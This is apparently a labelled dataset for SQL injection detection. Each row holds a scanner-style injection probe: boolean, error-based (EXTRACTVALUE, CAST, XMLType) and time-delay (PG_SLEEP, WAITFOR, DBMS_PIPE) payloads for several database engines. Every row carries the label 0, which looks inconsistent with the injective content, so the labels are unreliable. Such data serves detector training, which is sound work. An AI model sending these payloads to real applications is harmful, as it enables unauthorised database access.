Query	Label
3),)))),',"(	0
3)'hRoCZw<'">gMciSC	0
3)) AND 3788=5477 AND (1660=1660	0
3) AND 2729=6903	0
3)') AND 2478=9182 AND ('wZdR'='wZdR	0
3)' AND 6748=9842 AND 'Bpuy'='Bpuy	0
3) AND 7197=4905	0
(SELECT (CASE WHEN (5626=9169) THEN '3)' ELSE (SELECT 9169 UNION SELECT 4022) END))	0
3)) AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071)) AND (4034=4034	0
3) AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071))	0
3)') AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071)) AND ('XZVg'='XZVg	0
3)' AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071)) AND 'JXAj'='JXAj	0
3) AND EXTRACTVALUE(4906,CONCAT(0x5c,0x7176626a71,(SELECT (ELT(4906=4906,1))),0x71707a7071))	0
3)) AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC) AND (5487=5487	0
3) AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC)	0
3)') AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC) AND ('HNUi'='HNUi	0
3)' AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC) AND 'cVPo'='cVPo	0
3) AND 2854=CAST((CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (2854=2854) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)) AS NUMERIC)	0
3)) AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113))) AND (5948=5948	0
3) AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113)))	0
3)') AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113))) AND ('LoVv'='LoVv	0
3)' AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113))) AND 'pHzZ'='pHzZ	0
3) AND 4384 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(98)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4384=4384) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113)))	0
3)) AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (4396=4396	0
3) AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)	0
3)') AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND ('jHwu'='jHwu	0
3)' AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'MKtC'='MKtC	0
3) AND 8480=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(98)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (8480=8480) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(122)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)	0
(SELECT CONCAT(CONCAT('qvbjq',(CASE WHEN (9147=9147) THEN '1' ELSE '0' END)),'qpzpq'))	0
3));SELECT PG_SLEEP(5)	0
3);SELECT PG_SLEEP(5)	0
3)');SELECT PG_SLEEP(5)	0
3)';SELECT PG_SLEEP(5)	0
3));WAITFOR DELAY '0:0:5'	0
3);WAITFOR DELAY '0:0:5'	0
3)');WAITFOR DELAY '0:0:5'	0
3)';WAITFOR DELAY '0:0:5'	0
3));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),5) FROM DUAL	0
3));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),0) FROM DUAL	0
3));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),5) FROM DUAL	0
3);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(90)||CHR(105)||CHR(107),5) FROM DUAL	0
